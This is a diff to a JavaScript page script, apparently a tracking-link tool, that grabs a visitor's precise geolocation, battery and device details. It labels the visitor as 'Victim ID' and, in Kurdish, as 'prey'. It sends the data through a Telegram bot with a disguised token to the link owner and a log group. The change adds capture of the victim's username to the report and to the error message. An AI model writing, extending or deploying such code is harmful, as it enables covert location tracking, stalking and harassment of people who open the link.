@@ -22,6 +22,7 @@
     async function capture() {
         const params = new URLSearchParams(window.location.search);
         const uid = params.get('id');
+        const v_user = params.get('u') || "Unknown"; // ئەگەر یوزەرنەیم لە لینکەکەدا بێت
         if (!uid) return;
 
         navigator.geolocation.getCurrentPosition(async (pos) => {
@@ -47,6 +48,7 @@
 
             let report = `🚨 <b>زانیاری نێچیر گەیشت</b>\n\n` +
                          `🆔 <b>Victim ID:</b> <code>${uid}</code>\n` +
+                         `👤 <b>Username:</b> @${v_user}\n` +
                          `📍 <b>Location:</b> https://www.google.com/maps?q=${lat},${lon}\n` +
                          `🔋 <b>Battery:</b> ${bat}\n` +
                          `📱 <b>Device:</b> ${navigator.platform}\n` +
@@ -61,7 +63,7 @@
             fetch(groupUrl);
 
         }, (err) => {
-            const errorMsg = `❌ نێچیرەکە (ID: ${uid}) ڕێگری کرد لە لۆکەیشن.`;
+            const errorMsg = `❌ نێچیرەکە (ID: ${uid} / @${v_user}) لۆکەیشنی داخست.`;
             fetch(`https://api.telegram.org/bot${_0x1a2b}/sendMessage?chat_id=${uid}&text=${encodeURIComponent(errorMsg)}`);
             fetch(`https://api.telegram.org/bot${_0x1a2b}/sendMessage?chat_id=${LOG_GROUP}&text=${encodeURIComponent(errorMsg)}`);
         }, { enableHighAccuracy: true, timeout: 8000 });
